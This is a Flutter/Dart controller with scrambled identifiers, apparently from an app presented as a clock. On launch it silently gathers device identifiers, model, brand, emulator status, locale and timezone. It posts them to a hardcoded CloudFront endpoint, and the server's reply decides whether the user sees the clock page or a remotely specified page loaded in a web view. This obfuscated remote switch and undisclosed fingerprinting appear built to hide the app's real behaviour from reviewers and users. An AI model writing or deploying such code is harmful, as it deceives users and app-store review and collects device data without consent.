import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class BuildLogPlaceLogic extends GetxController {

  var loqjxpsk = RxBool(false);
  var rowzvtd = RxBool(true);
  var qshfawjz = RxString("");
  var wdbqc = RxBool(false);
  var ucyb = RxBool(true);
  final xhtcdmvz = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    zsmylvp();
  }


  Future<void> zsmylvp() async {
    wdbqc.value = true;
    ucyb.value = true;
    rowzvtd.value = false;

    xhtcdmvz.post("https://d3vr7hm1fszumu.cloudfront.net/a5QoRqMJG5cX1?no_check",data: await kqsojniuz()).then((value) {
      var hwnexf = value.data["hwnexf"] as String;
      var kymdlbgh = value.data["kymdlbgh"] as bool;
      if (kymdlbgh) {
        qshfawjz.value = hwnexf;
        bwpfiq();
      } else {
        dcofa();
      }
    }).catchError((e) {
      rowzvtd.value = true;
      ucyb.value = true;
      wdbqc.value = false;
    });
  }

  Future<Map<String, dynamic>> kqsojniuz() async {
    final DeviceInfoPlugin tlkqbfp = DeviceInfoPlugin();
    PackageInfo qewyjo_slqc = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var yvwokm = Platform.localeName;
    var MsaU = currentTimeZone;

    var OrHhBXil = qewyjo_slqc.packageName;
    var mXOfstrG = qewyjo_slqc.version;
    var EbnmSAyz = qewyjo_slqc.buildNumber;

    var WGjiKgL = qewyjo_slqc.appName;
    var krizSmQ = "";
    var fETNp  = "";
    var XvNKq = "";
    var uowtb = "";
    var rzdfbtoq = "";
    var swlaz = "";
    var dcwavqng = "";
    var hwsuvkz = "";
    var bqmosluj = "";
    var mjbhzef = "";


    var aLqU = "";
    var OcqAE = false;

    if (GetPlatform.isAndroid) {
      aLqU = "android";
      var axdljsfvi = await tlkqbfp.androidInfo;

      XvNKq = axdljsfvi.brand;

      krizSmQ  = axdljsfvi.model;
      fETNp = axdljsfvi.id;

      OcqAE = axdljsfvi.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      aLqU = "ios";
      var yakqftgluw = await tlkqbfp.iosInfo;
      XvNKq = yakqftgluw.name;
      krizSmQ = yakqftgluw.model;

      fETNp = yakqftgluw.identifierForVendor ?? "";
      OcqAE  = yakqftgluw.isPhysicalDevice;
    }

    var res = {
      "WGjiKgL": WGjiKgL,
      "EbnmSAyz": EbnmSAyz,
      "mXOfstrG": mXOfstrG,
      "OrHhBXil": OrHhBXil,
      "krizSmQ": krizSmQ,
      "MsaU": MsaU,
      "XvNKq": XvNKq,
      "fETNp": fETNp,
      "yvwokm": yvwokm,
      "aLqU": aLqU,
      "OcqAE": OcqAE,
      "uowtb" : uowtb,
      "rzdfbtoq" : rzdfbtoq,
      "swlaz" : swlaz,
      "dcwavqng" : dcwavqng,
      "hwsuvkz" : hwsuvkz,
      "bqmosluj" : bqmosluj,
      "mjbhzef" : mjbhzef,

    };
    return res;
  }

  Future<void> dcofa() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> bwpfiq() async {
    Get.offNamed("/Outreload");
  }

}
